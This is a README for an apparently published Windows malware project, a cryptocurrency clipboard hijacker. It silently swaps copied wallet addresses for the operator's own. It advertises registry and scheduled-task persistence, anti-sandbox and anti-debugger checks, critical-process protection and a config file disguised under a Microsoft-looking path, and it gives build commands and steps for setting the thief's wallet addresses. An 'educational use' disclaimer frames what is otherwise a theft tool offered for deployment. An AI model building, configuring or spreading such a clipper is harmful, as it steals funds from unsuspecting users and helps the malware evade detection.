# Crypto Clipboard Hijacker

[![Build](https://img.shields.io/github/actions/workflow/status/cryptotools/clipboard-hijacker/build.yml?branch=main&style=flat-square)](https://github.com/cryptotools/clipboard-hijacker/actions)
[![License](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cryptotools/clipboard-hijacker?style=flat-square)](https://github.com/cryptotools/clipboard-hijacker/stargazers)
[![.NET](https://img.shields.io/badge/.NET-9.0-purple?style=flat-square)](https://dotnet.microsoft.com/)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey?style=flat-square)]()

**BTC / ETH / XMR / SOL / TRX / LTC | Silent Replace | Persistence | Anti-Analysis**

A clipboard monitoring tool that detects cryptocurrency wallet addresses and performs real-time replacement. Built with modern C# and .NET 9 for research and educational purposes in offensive security.

---

## Screenshots

![Dashboard](docs/screenshots/dashboard.png)
![Config](docs/screenshots/config.png)

---

## Features

- **Multi-Coin Support** — Bitcoin (Legacy/SegWit/Bech32), Ethereum, Monero, Solana, TRON, Litecoin
- **Source-Generated Regex** — Compile-time regex for maximum performance
- **Win32 Clipboard API** — Direct P/Invoke, no WinForms dependency
- **Persistence** — Registry Run key + Task Scheduler fallback
- **Anti-Sandbox** — Detects debuggers, analysis tools, VM artifacts
- **Process Protection** — Critical process flag via NtSetInformationProcess
- **Single Instance** — Global mutex prevents duplicate execution
- **Statistics** — Tracks replacement count per coin type
- **Minimal Footprint** — PublishTrimmed + SingleFile, ~2MB output

---

## Architecture

```
src/CryptoClipper/
├── Core/           → Clipboard monitoring, address matching, replacement logic
├── Wallets/        → Per-coin regex matchers (BTC, ETH, XMR, SOL, TRX, LTC)
├── Models/         → Data types, enums, event records
├── Persistence/    → Registry startup, Task Scheduler
├── Stealth/        → Anti-sandbox, mutex, process protection
├── Config/         → Runtime configuration, wallet addresses
├── Utils/          → Win32 clipboard P/Invoke, regex patterns
└── Reporting/      → Statistics aggregation and logging
```

---

## Build

### Requirements

- .NET 9 SDK
- Windows 10/11 (x64)

### Compile

```bash
dotnet build src/CryptoClipper/CryptoClipper.csproj -c Release
```

### Publish (Single File)

```bash
dotnet publish src/CryptoClipper/CryptoClipper.csproj -c Release -r win-x64 --self-contained
```

---

## Configuration

Edit `WalletAddresses.cs` to set your replacement addresses before building:

```csharp
public string Bitcoin { get; set; } = "bc1q...your_address_here";
public string Ethereum { get; set; } = "0x...your_address_here";
```

Runtime configuration is stored in:
```
%LOCALAPPDATA%\Microsoft\CLR\config.dat
```

---

## Usage

```bash
# Run directly
.\CryptoClipper.exe

# The process runs silently in background monitoring clipboard
# Any detected crypto address is replaced with configured wallet
```

---

## Supported Address Formats

| Coin | Format | Example |
|------|--------|---------|
| BTC | Legacy (1...) | `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` |
| BTC | SegWit (3...) | `3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy` |
| BTC | Bech32 (bc1...) | `bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4` |
| ETH | EIP-55 (0x...) | `0x71C7656EC7ab88b098defB751B7401B5f6d8976F` |
| XMR | Standard (4...) | `888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbAN...` |
| SOL | Base58 | `DRpbCBMxVnDK7maPM5tGv6MvB3v1sRMC86PZ8okm21hy` |
| TRX | Base58 (T...) | `TN2TR5eaJJyBmGCvTHrEQgvK3bdMS3RXfn` |
| LTC | Bech32 (ltc1...) | `ltc1qw508d6qejxtdg4y5r3zarvary0c5xw7kgmn4n9` |

---

## Disclaimer

This software is provided for **educational and authorized security research purposes only**. It is designed for use in controlled lab environments, CTF competitions, and penetration testing engagements with explicit written authorization. The authors assume no liability for misuse. Unauthorized use against systems you do not own or have permission to test is illegal and unethical.

---

## License

MIT License — See [LICENSE](LICENSE) for details.
